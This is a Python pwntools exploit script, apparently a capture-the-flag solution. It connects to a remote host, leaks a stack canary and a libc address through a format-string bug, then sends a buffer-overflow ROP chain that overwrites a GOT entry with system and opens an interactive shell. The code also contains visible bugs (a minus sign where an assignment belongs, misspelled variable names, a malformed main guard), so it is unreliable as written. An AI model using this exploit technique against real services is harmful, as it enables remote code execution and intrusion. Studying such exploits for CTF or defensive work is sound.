#!/usr/bin/python3

from pwn import *
snprintf_got = 0x804c028
snprintf_offset = 0x00053e10
binSH_offset = 0x18f352

gets_got = 0x0804c00c
gets_plt = 0x08049040
pop_pop_ret = 0x08049333

system_offset = 0x048420

def main():
  p = remote("144.26.62.184", 8888)
  
  #leak Canary
  p.sendline("%29$x")
  canary = p.recv()
  log.info("Canary value: %s",canary)
  
  #leak snprintf_libc
  payload = p32(snprintf_got) + b"%4$s\n"
  p.send(payload)
  
  p.recv(4)
  leak_data = p.recv(4)
  snprintf_libc = u32(leak_data)
  log.info("Snprintf@libc : 0x%x", snprintf_libc)
  
  #leak system_libc
  libc_start_addr = snprintf_libc - snprintf_offset
  bin_sh = libc_start_addr + binSh_offset
  
  payload - b"A"*100 + p32(int(canart,16)) + b"A"*12
  
  payload += p32(gets_plt)
  payload += p32(pop_pop_ret)
  payload += p32(bin_sh)
  
  payload += p32(gets_plt)
  payload += p32(0xdeadbeef)
  payload += p32(bin_sh)
  
  p.send (payload +b'\n')
  system_libc = libc_start_addr + system_offset
  log.info("System@libc address: 0x%x", system_libc)
  
  p.send(p32(system_libc)+b'\n')
  
  #change to interactive mode
  p.interactive()
  
  if ___name__ == "__main__":
    main()
  
  
  
  
